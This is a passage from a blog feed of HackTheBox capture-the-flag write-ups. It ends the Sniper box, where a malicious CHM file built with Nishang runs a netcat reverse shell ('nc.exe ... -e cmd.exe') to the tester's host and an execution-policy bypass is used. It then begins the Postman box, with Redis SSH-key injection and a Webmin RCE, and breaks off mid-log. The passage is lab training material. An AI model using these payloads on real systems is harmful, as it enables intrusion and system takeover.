class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">17</span> AM           <span class="number">552</span>,<span class="number">607</span> php <span class="keyword">for</span> dummies-trial.pdf</span><br><span class="line">               <span class="number">2</span> File(s)        <span class="number">552</span>,<span class="number">892</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">17</span>,<span class="number">953</span>,<span class="number">026</span>,<span class="number">048</span> bytes free</span><br></pre></td></tr></table></figure><h3 id="Note-txt"><a href="#Note-txt" class="headerlink" title="Note.txt"></a>Note.txt</h3><p>What‚Äôs on the <code>note.txt</code> ? Well this:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Docs&gt;more note.txt</span><br><span class="line">more note.txt</span><br><span class="line">Hi Chris,</span><br><span class="line">        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website <span class="keyword">as</span> there are a lot of bugs <span class="keyword">on</span> it. And I hope that you<span class="string">'ve prepared the documentation for our new app. Drop it here when you'</span>re done with it.</span><br><span class="line"></span><br><span class="line">Regards,</span><br><span class="line">Sniper CEO.</span><br><span class="line"></span><br><span class="line">C:\Docs&gt;</span><br></pre></td></tr></table></figure><p>So hints is on the note ‚áí <code>&quot;The documentaion for the new app, then I will drop it here when I&#39;m done with it.&quot;</code> So there‚Äôs a file here here which the Administrator will checked and open it.</p><h3 id="CHM-File"><a href="#CHM-File" class="headerlink" title="CHM File"></a>CHM File</h3><p>Next, in the <code>C:\Users\Chris\Downloads</code> directory there‚Äôs a <code>CHM</code> file.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Docs&gt;cd \Users\Chris\Downloads</span><br><span class="line">cd \Users\Chris\Downloads</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Downloads\dir</span><br><span class="line">dir</span><br><span class="line">  Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line">  Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line">  Directory of C:\Users\Chris\Downloads</span><br><span class="line"></span><br><span class="line"><span class="number">03</span>/<span class="number">27</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">46</span> PM &lt;DIR&gt;               .</span><br><span class="line"><span class="number">03</span>/<span class="number">27</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">46</span> PM &lt;DIR&gt;               ..</span><br><span class="line"><span class="number">03</span>/<span class="number">27</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">46</span> PM                 <span class="number">281</span> a.html</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">36</span> AM              <span class="number">10</span>,<span class="number">462</span> instructions.chm</span><br><span class="line">               <span class="number">2</span> File(s)           <span class="number">10</span>,<span class="number">743</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)    <span class="number">17</span>,<span class="number">945</span>,<span class="number">899</span>,<span class="number">008</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Downloads&gt;</span><br></pre></td></tr></table></figure><h3 id="Generate-Malicious-CHM-File"><a href="#Generate-Malicious-CHM-File" class="headerlink" title="Generate Malicious CHM File"></a>Generate Malicious CHM File</h3><p>To view the chm file, you need to open it with Windows, so I transferred the chm file to my Windows machine, and it is<br>precisely the documentation for the app, requested by the Sniper CEO:</p><p>Administrator will checked <code>CHM</code> and open it then the payload will triggered.</p><p><img src="/img/sniper/instructions1.png" alt="HackTheBox-Sniper/sniper-instructions1.png" title="Sniper Instructions"></p><p>This one is new to me I have never had anything to do with CHM files‚Äô so I did some research about <code>CHM File</code> and I found that you can create a malicious <code>CHM File</code> with <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a> and use the <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">Out-CHM.ps1</a>.</p><p>I try to download first the <code>Out-CHM.ps1</code> in my Windows but it rejected because it is considered as a virus‚Äô. Well creating a malicious <code>CHM File</code> was fuck me‚Äô as my Windows always deny it even i disable my windows security for a while, Powershell will always reject it.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; import-module Out-CHM.ps1</span><br><span class="line">..\Out-CHM.ps1 : The term <span class="string">'Out-CHM.ps1'</span> <span class="keyword">is</span> not recognized <span class="keyword">as</span> the name of a cmdlet, function, script file, or</span><br><span class="line">operable program. Check the spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path <span class="keyword">is</span> correct and <span class="keyword">try</span></span><br><span class="line">again.</span><br><span class="line">At line:<span class="number">1</span> <span class="keyword">char</span>:<span class="number">1</span></span><br><span class="line">+ ..\Out-CHM.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (Out-CHM.ps1:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt;</span><br></pre></td></tr></table></figure><p>but I managed it too using <code>powershell -ep bypass</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; powershell -ep bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Try the <span class="keyword">new</span> cross-platform PowerShell https:<span class="comment">//aka.ms/pscore6</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt;</span><br></pre></td></tr></table></figure><p>Now before generate a <code>CHM</code> file we need to download this first <a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">HTML Help Workshop</a> from Microsoft and choose <code>htmlhelp.exe</code> (run/install it). This will create the folder C:\Program Files (x86)\HTML Help<br>Workshop with the needed programs to create the malicious .chm file.</p><p>and Finally, I can now create <code>CHM</code> file.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; import-module .\Out-CHM.ps1</span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; Out-CHM -Payload <span class="string">"C:\payas0\nc.exe 10.10.14.216 1234 -e cmd.exe"</span> -HHCPath <span class="string">"C:\Program Files (x86)\HTML Help Workshop"</span></span><br><span class="line">Microsoft HTML Help Compiler <span class="number">4.74</span><span class="number">.8702</span></span><br><span class="line"></span><br><span class="line">Compiling c:\Users\Medz\Documents\sniper\doc.chm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Compile time: <span class="number">0</span> minutes, <span class="number">0</span> seconds</span><br><span class="line"><span class="number">2</span>       Topics</span><br><span class="line"><span class="number">4</span>       Local links</span><br><span class="line"><span class="number">4</span>       Internet links</span><br><span class="line"><span class="number">0</span>       Graphics</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Created c:\Users\Medz\Documents\sniper\doc.chm, <span class="number">13</span>,<span class="number">448</span> bytes</span><br><span class="line">Compression increased file <span class="keyword">by</span> <span class="number">280</span> bytes.</span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Medz\Documents\sniper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        <span class="number">6</span>/<span class="number">30</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">58</span> PM                Basic Linux Privilege Escalation_files</span><br><span class="line">-a----        <span class="number">6</span>/<span class="number">30</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">58</span> PM          <span class="number">56717</span> Basic Linux Privilege Escalation.html</span><br><span class="line">-a----        <span class="number">3</span>/<span class="number">29</span>/<span class="number">2020</span>   <span class="number">3</span>:<span class="number">20</span> AM          <span class="number">13448</span> doc.chm</span><br><span class="line">-a----        <span class="number">3</span>/<span class="number">29</span>/<span class="number">2020</span>   <span class="number">3</span>:<span class="number">05</span> AM          <span class="number">19502</span> Out-CHM.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt;</span><br></pre></td></tr></table></figure><h2 id="Gain-the-Administrator-Shell"><a href="#Gain-the-Administrator-Shell" class="headerlink" title="Gain the Administrator Shell"></a>Gain the Administrator Shell</h2><p>So it‚Äôs done ! Now I will upload <code>doc.chm</code> in <code>C:\Docs</code> directory of SNIPER machine.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Docs&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Docs</span><br><span class="line"></span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">07</span>:<span class="number">19</span> PM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">07</span>:<span class="number">19</span> PM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">31</span> AM               <span class="number">285</span> note.txt</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">17</span> AM           <span class="number">552</span>,<span class="number">607</span> php <span class="keyword">for</span> dummies-trial.pdf</span><br><span class="line">               <span class="number">2</span> File(s)        <span class="number">552</span>,<span class="number">892</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">17</span>,<span class="number">987</span>,<span class="number">465</span>,<span class="number">216</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Docs&gt;copy \\<span class="number">10.10</span><span class="number">.15</span><span class="number">.33</span>\medz\doc.chm .</span><br><span class="line">copy \\<span class="number">10.10</span><span class="number">.15</span><span class="number">.33</span>\medz\doc.chm .</span><br><span class="line">        <span class="number">1</span> file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Docs&gt;</span><br></pre></td></tr></table></figure><p>Once we put the <code>doc.chm</code> file in <code>Docs</code> I simply setup <code>netcat</code> listener with my port i generated in malicious chm file. Now all i need to do is to wait the Administrator to checked and open it.</p><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>After 2-3 minutes I have the administrator shell ! Very nice box !</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ nc -lnvp <span class="number">1234</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">1234</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.15</span><span class="number">.33</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>] <span class="number">49703</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.678</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami &amp; hostname</span><br><span class="line">whoami &amp; hostname</span><br><span class="line">sniper\administrator</span><br><span class="line">Sniper</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h3 id="Get-the-root-txt"><a href="#Get-the-root-txt" class="headerlink" title="Get the root.txt"></a>Get the root.txt</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;cd \Users\Administrator</span><br><span class="line">cd \Users\Administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator</span><br><span class="line"></span><br><span class="line"><span class="number">04</span>/<span class="number">09</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">47</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">04</span>/<span class="number">09</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">47</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          <span class="number">3</span>D Objects</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Contacts</span><br><span class="line"><span class="number">10</span>/<span class="number">01</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">44</span> AM    &lt;DIR&gt;          Desktop</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Documents</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Downloads</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Favorites</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Links</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Music</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Pictures</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Saved Games</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Searches</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Videos</span><br><span class="line">               <span class="number">0</span> File(s)              <span class="number">0</span> bytes</span><br><span class="line">              <span class="number">14</span> Dir(s)  <span class="number">17</span>,<span class="number">986</span>,<span class="number">367</span>,<span class="number">488</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;cd Desktop </span><br><span class="line">cd Desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>/<span class="number">01</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">44</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">10</span>/<span class="number">01</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">44</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">13</span> AM                <span class="number">32</span> root.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">32</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">17</span>,<span class="number">986</span>,<span class="number">367</span>,<span class="number">488</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;more root.txt</span><br><span class="line">more root.txt</span><br><span class="line"><span class="number">5624</span>c[-------------------]<span class="number">436</span>c15</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">LFI to RFI</a></p><p><a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" target="_blank" rel="noopener">WebShell for Windows</a></p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noopener">Access Privilege Checked</a></p><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">HTML Workshop</a></p><p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">Nishang - Out-CHM</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> retired </tag>
            
            <tag> php </tag>
            
            <tag> lfi </tag>
            
            <tag> rfi </tag>
            
            <tag> chm </tag>
            
            <tag> unintended </tag>
            
            <tag> windows </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Postman</title>
      <link href="/2020-03-13/HackTheBox-Postman/"/>
      <url>/2020-03-13/HackTheBox-Postman/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/postman/postman1.png" alt="HackTheBox-Postman/postman.png" title="Postman details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí This easy machine is very fit to all beginners to learn the basic of Penetration Testing. The machine have a vulnerable software ‚Äì <code>Redis</code>.<br>   Redis is unprotected without a password set up, and so forth. The simplest thing you can do in such a case, is to write random file such as SSH keys which i‚Äôll use to get in into the machine. After getting the shell, there‚Äôs SSH key for user Matt. The machine is very straightforward to the root after you get the credentials of the user and use it for another vulnerability ‚Äì <code>CVE Webmin 1.910</code>.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service on different ports</p><p>‚Üí Bruteforce the Web page directories</p><p>‚Üí Check the software vulnerabilities</p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Check if we can inject or put some file inside in the Redis</p><p>‚Üí The goal is to transfer SSH keys</p><p>‚Üí Get in into redis shell</p></li><li><p><strong>Exploitation</strong></p><p>‚Üí Find some interesting things using <code>LinEnum.sh</code> that can use for Exploitation</p><p>‚Üí Get the backup SSH key of a user</p><p>‚Üí Use the credentials for <code>CVE Webmin 1.910</code></p><p>‚Üí Get the root shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí First, I run the <strong>Nmap</strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-T 0-5   ‚áí Set timing template - higher is faster (less accurate)</li><li>-p-      ‚áí Scan all 65535 ports</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-T4</span> <span class="string">-p-</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.154</span> <span class="string">-oN</span> <span class="string">nmap-postman</span></span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p><ul><li>22           ‚áí running on OpenSSH 7.6p1</li><li>80        ‚áí running on Apache/2.24.49</li><li>6379      ‚áí running on Redis key-value version 4.0.9</li><li>10000     ‚áí running on MiniServ 1.910 (Webmin httpd)</li></ul><p><img src="/img/postman/nmap-postman.png" alt="HackTheBox-Postman/nmap-postman.png" title="Nmap Postman"></p><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I visited the web page in port 80 and there‚Äôs nothing interesting stuffs here except the <code>Postman@htb</code> so added it into my <code>/etc/hosts/</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">10.10.10.160postman.htb</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-webpage.gif" alt="HackTheBox-Postman/postman-webpage.gif" title="Webpage of Postman"></p><h3 id="Scan-the-Web-directories"><a href="#Scan-the-Web-directories" class="headerlink" title="Scan the Web directories"></a>Scan the Web directories</h3><p>So, since I don‚Äôt have any clue what is on the Web page, I use <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to find some stuffs with the following command.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">‚ùØ python3 /opt/dirsearch/dirsearch.py -u <span class="string">"http://10.10.10.160"</span> -e asd -x 403,404 --simple-report=postman-directories</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-dirsearch.png" alt="HackTheBox-Postman/postman-dirsearch.png" title="Dirsearch"></p><p>So I have this following directories, everything is a normal web directories except on the <code>/upload/</code> directory which caught my attention.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[07:32:03] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                      </span><br><span class="line">[07:32:18] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                      </span><br><span class="line">[07:32:24] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/     </span><br><span class="line">[07:32:26] 200 -    4KB - /index.html                                                                          </span><br><span class="line">[07:32:29] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                                              </span><br><span class="line">[07:33:26] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/</span><br><span class="line"></span><br><span class="line">[07:33:26] 200 -    8KB - /upload/</span><br></pre></td></tr></table></figure><p>Going to the <code>/upload/</code> directory we will see a lot of image there. I tried to look fo the interesting image‚Äô but I realize that this one is a rabbit hole so moved on and go the next phase.</p><h3 id="Upload-page"><a href="#Upload-page" class="headerlink" title="Upload page"></a>Upload page</h3><p><img src="/img/postman/postman-upload.png" alt="HackTheBox-Postman/postman-upload.png" title="Upload directory"></p><h3 id="Webmin-1-910"><a href="#Webmin-1-910" class="headerlink" title="Webmin 1.910"></a>Webmin 1.910</h3><p>Next is to visit the <code>Port 10000</code> which holding an <code>HTTP</code> service ‚Äì <code>Miniserv 1.910 (Webmin httpd)</code></p><p><img src="/img/postman/postman-webmin.png" alt="HackTheBox-Postman/postman-webmin.png" title="Webmin 1.910"></p><p>I search the <code>webmin</code> version that runs on the machine to look if there‚Äôs an existing exploit and there is.</p><p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce" target="_blank" rel="noopener">Webmin Package Updates Remote Code Execution</a>.</p><p>   ‚Üí  Description: This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the ‚ÄúPackage Updates‚Äù module can execute arbitrary commands with root privileges.</p><p>Since I don‚Äôt have any credentials that will use on that exploits, i will leave this for a while and moved on to the next phase of hunting.</p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><p>Next is to try Redis that appear on my nmap scan.<br>‚Üí Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker.</p><p>I used the <a href="https://packages.debian.org/stretch/redis-tools" target="_blank" rel="noopener">redis-tools package</a> to communicate to the service of Redis. The existing vulnerability in version 4.0.9, you can interact redis without username and password.</p><p>So, to start let‚Äôs check if I can access the instance, which is a prerequisite:</p><h3 id="Communicate-with-telnet"><a href="#Communicate-with-telnet" class="headerlink" title="Communicate with telnet"></a>Communicate with telnet</h3><p><img src="/img/postman/postman-telnet.png" alt="HackTheBox-Postman/postman-telnet.png" title="Redis Telnet"></p><p>Works, <code>Redis</code> it is unprotected without a password set up.</p><p>Next is to try the <code>redis-cli</code> to look if i‚Äôll got something.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">‚ùØ redis-cli -h 10.10.10.160</span><br><span class="line">10.10.10.160:6379&gt; get s-key</span><br><span class="line"><span class="string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0+WZO2fM8J6HgUa5kgmE4xQwjMbiWFUYOND+7Qpm6a4XmJM6NABlIOUTe5FnUx+KZmcHlAenOqVdDPsa9rE1G9vZVi8OSFNJ6xplYzyFD9pzyFJ+e2Zz6c6RD2uptE9meJAiE+RQFpNM5TqZgpmlYGG1fi/2Pgtud7I0Lj95S/lRWqtvVN6uK44lKWru+YYwGtA+3unG+0lgRJrC+58+VFV/Cm54ZvJUd/I/4Q08ij6qx4AD1Y0xQqWKoDZMvb0kluzIRcvaYrTEKaFhxVpliVlqP6U3HFgeVZ2AJB redis@server\n\n\n\n"</span></span><br><span class="line">10.10.10.160:6379&gt;</span><br></pre></td></tr></table></figure><p>By using <code>get s-key</code> command inside <code>redis</code> it shows that there‚Äôs an existing ssh key that use for authentication. As a redis user shell I can write something in the database to a file with <code>SAVE</code> command. So I was thinking if I can put mine to get in.</p><h3 id="Inject-SSH-Keys"><a href="#Inject-SSH-Keys" class="headerlink" title="Inject SSH Keys"></a>Inject SSH Keys</h3><p>Since the <code>Redis</code> is not protected. I will try to write something into ~/.ssh/authorized_keys in order to gain access to shell. So i will generate my <code>SSH Key</code> first and save into my postman directory.</p><p><code>OPENSSH Key</code> will not valid. To get this work I‚Äôll need <code>RSA PRIVATE Key</code> using this line I can push my ssh-key into private key.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -m PEM -t rsa -b 4096 -C bunny@lanaya</span><br></pre></td></tr></table></figure><p><strong>Generated SSH Key</strong></p><p><img src="/img/postman/postman-rsa-keys.png" alt="HackTheBox-Postman/postman-rsa-keys.png" title="Payas0 RSA Private Key"></p><p>Now I‚Äôve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one.</p><p>So‚Äô by following this <a href="https://ebook.konfigurasi.net/Security/Kali_Linux_An_Ethical_Hacker' target="_blank" rel="noopener"s_Cookbook.pdf">method</a> I will now put my generated ssh-key.</p><p><img src="/img/postman/postman-flushall.png" alt="HackTheBox-Postman/postman-flushall.png" title="Inject SSH Keys"></p><p>Now Let‚Äôs now put my SSH Key into the <code>Redis</code>.<br>Using <code>redis-cli</code> I can check, set a directory for redis and save.</p><p><img src="/img/postman/postman-config.png" alt="HackTheBox-Postman/postman-config.png" title="Inject SSH Keys"></p><p>I‚Äôve successfully save my SSH key. Now I‚Äôll try to login with ssh.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">‚ùØ ssh -v -i id_rsa redis@10.10.10.160</span><br><span class="line">OpenSSH_8.1p1 Debian-1, OpenSSL 1.1.1d  10 Sep 2019</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 19: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to 10.10.10.160 [10.10.10.160] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa <span class="built_in">type</span> 0</span><br><span class="line">debug1: identity file id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_8.1p1 Debian-1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 pat 